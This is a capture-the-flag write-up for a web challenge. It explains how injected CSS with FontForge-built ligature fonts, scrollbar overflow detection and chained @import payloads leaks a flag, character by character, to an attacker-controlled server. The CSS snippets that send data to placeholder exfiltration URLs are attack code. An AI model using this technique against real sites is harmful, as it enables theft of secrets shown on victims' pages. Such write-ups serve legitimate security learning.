# web/Web Design Championship
**CTF**: Srdnlen CTF 2026 Finals

**Category**: Web

**Difficulty**: Medium

**Solves**: 6

**Author**: @tol0meo (Samuele Tolomeo)

---

## Description
### The website
---
The website is centered around a web design contest.

The only page that is present has the following functionalities:
- Setting a bank account number to receive the prize money
- Previewing a custom, user-supplied CSS style in the page
- Submitting the aforementioned CSS style to the contest

If a bank account number is set, it is displayed on the
page.

When a CSS style is previewed, the code gets base64encoded
and put in a query parameter `?css=`.

---
### The code
---
Looking at the code, we can see the three most important
files: `app.py`, `bot.py`, `templates/index.html`.

Inside `bot.py`, we can see that whenever a CSS style is submitted, the admin bot visits the page with that style applied and its bank account number set to the flag
The flag will therefore be displayed on the page.

Looking at `app.py`, we can see that the application runs a Flask server. The templates/index.html template receives two relevant values: the CSS style, obtained by Base64-decoding the `?css=` query parameter, and the bank account number stored in the secret cookie.

Reading `templates/index.html` we can see that both the
`secret` cookie and the `css` code are placed inside the
page with the `{{ }}` syntax, without applying the `| safe` filter.

This means that anything we'll write in `secret` or `css` will be escaped.

---
### The vuln
---

Given that we can control some of the content rendered on the page, our first instinct might be to try and achieve XSS.

Unfortunately, as mentioned earlier, the values we control are properly escaped before being rendered into the page, meaning that we cannot directly achieve XSS.

However, we do have the ability to inject arbitrary CSS, which suggests another approach.

Our goal is therefore to somehow extract the flag displayed on the page using CSS alone.

---
### The exploit
---

**TLDR: https://github.com/adrgs/fontleak**
> I didn't know this tool lmao so my exploit was written from scratch, have fun reading

CSS does not provide any built-in way to explicitly select a node based on its text content, but we can exploit various mechanisms to achieve the same result.

In this case, we'll use **font-ligature-based CSS exfiltration** to leak the contents of the `div#secret` element, which contains the flag.

We will exploit ligatures
> *Ligatures are a feature of fonts that allow sequences of characters to be rendered as a single glyph, which may look completely different from the individual characters that make up the sequence. They are commonly used in programming fonts such as Fira Code.*

to detect the presence of a substring inside an element, to exfiltrate the flag one character at a time, just as in a traditional attribute-based CSS exfiltration attack.

In simpler terms:
1. We will set the font of `div#secret` to be one in which every character has zero width
    - The element will therefore also have approx. zero width
2. Also, we will set its CSS properties so that the text will stay in one line, and most importantly, we will give it a **max-width**
    - The element, having ~zero width, will **not** exceed it, meaning it will **not** be overflowing
3. We will craft `N` fonts using `FontForge` so that every font contains a ligature: `srdnlen{a`, `srdnlen{b`, `srdnlen{c`, and so on 
    - The ligature will have a very large width
4. If we apply the font containing a specific ligature (e.g. `srdnlen{a`) and the element **overflows**, we know that the ligature has been matched and applied. This tells us that the corresponding character sequence **is present in the text**, meaning we have **successfully leaked** the next character of the flag.
    - We will deliver the fonts using `data:`
    - We will detect the overflow with
    ```
    div#secret::-webkit-scrollbar {
        background-image: url(http://.../whatwefound);
    }
    ```
    - Repeat with new ligatures: `srdnlen{aa`, `srdnlen{ab`, ... to leak the whole flag
        - We'll iterate through the fonts using animations
        ```
        @import url(".../exploit.css?c=...&sess_id=...");
            
        /* searching for: aa? */
        
        @font-face {
            font-family: 'leak_aaa';
            src: url('data:font/ttf;base64,...');
        }
        @font-face {
            font-family: 'leak_aab';
            src: url('data:font/ttf;base64,...');
        }
        ...
        
        @keyframes animN {
            0% {
                font-family: 'leak_aaa', 'blank_font';
                --exfil-url: url("http://.../aaa");
            }
            1% {
                font-family: 'leak_aab', 'blank_font';
                --exfil-url: url("http://.../aab");
            }
            ...
        }
        
        div#secret:not(...) {
            animation: animN {len(alphabet)/10:.6f}s infinite;
            font-family: 'blank_font';
        }

        div#secret:not(...)::-webkit-scrollbar {
            background-image: var(--exfil-url);
        }
        ```
5. We will send to the client a single payload
    ```
    @import url(http://exploit-url/exploit.css);
    ```
    that will fetch the first payload from the exploit server.
    The payload will automatically queue the fetch of the next one, that will extract the second character, and so on.
    The n-th+1 payload gets delivered as soon as the server receives the n-th exfiltration from the client.

    Every payload bundles all the fonts used for the exfiltration, in base64 encoded form.

For more details, check `checker/exploit.py`.

---
### Useful links
https://en.wikipedia.org/wiki/Ligature_(writing)

https://hacktricks.wiki/en/pentesting-web/xs-search/css-injection/index.html#text-node-exfiltration-i-ligatures.
